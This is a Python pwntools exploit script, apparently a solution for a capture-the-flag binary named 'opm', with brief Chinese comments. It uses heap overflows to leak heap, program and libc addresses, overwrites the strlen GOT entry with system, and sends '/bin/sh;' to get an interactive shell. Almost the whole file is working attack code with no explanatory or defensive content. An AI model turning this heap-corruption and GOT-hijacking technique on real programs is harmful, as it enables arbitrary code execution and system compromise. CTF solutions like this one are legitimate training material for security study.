#!/usr/bin/env python
# coding=utf-8

from pwn import *

#context.log_level="debug"
# p = remote("localhost",1234)

p = process('./opm')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# Wait for debugger
pid = util.proc.pidof(p)[0]
print "The pid is: "+str(pid)
# util.proc.wait_for_debugger(pid)

def add(name,n):
        p.recvuntil("(E)")
        p.sendline("A")
        p.recvuntil("name:")
        p.sendline(name)
        p.recvuntil("punch?",timeout=1)
        p.sendline(str(n))

def show():
        p.recvuntil("(E)")
        p.sendline("S")



add('A'*0x70,1)
add('B'*0x80+"\x10",2)
add('C'*0x80,'3'+'d'*0x7f+'\x10')
#g()
# 泄漏程序基址
p.recvuntil("B"*8)
heap = u64((p.recvuntil(">",drop=True)).ljust(8,"\x00"))
print 'heap addr: '+hex(heap)
add('E'*8+p64(heap-0x30),str(131441).ljust(0x80,'f')+p64(heap+0xc0)) # 131441-0x20171 size of top thunk
#g()
p.recvuntil("<")
func = u64((p.recvuntil(">",drop=True)).ljust(8,"\x00"))
pro_base = func-0xb30

#g()
print 'proc_base: '+ hex(pro_base)

strlen_got = 0x202040
print 'strlen_got addr: '+hex(pro_base+strlen_got)

#g()
# 泄漏got表
add('G'*8+p64(pro_base+strlen_got),str(131441-0x30-0x20).ljust(0x80,'f')+p64(heap+0xc0+0x30+0x20))
p.recvuntil("<")
strlenaddr = u64((p.recvuntil(">",drop=True)).ljust(8,"\x00"))
print 'strlen addr: '+hex(strlenaddr)
libc_base = strlenaddr - libc.symbols['strlen']
print 'libc addr: ' + hex(libc_base)
system = libc_base + libc.symbols['system'] 
print 'system addr: '+hex(system)

# system地址低四字节覆盖strlen_got低四字节
# 实现got表劫持

add('U'*0x10,str(system&0xffffffff).ljust(0x80,'h')+p64(strlen_got+pro_base-0x18))
add('/bin/sh;','5')
p.interactive()
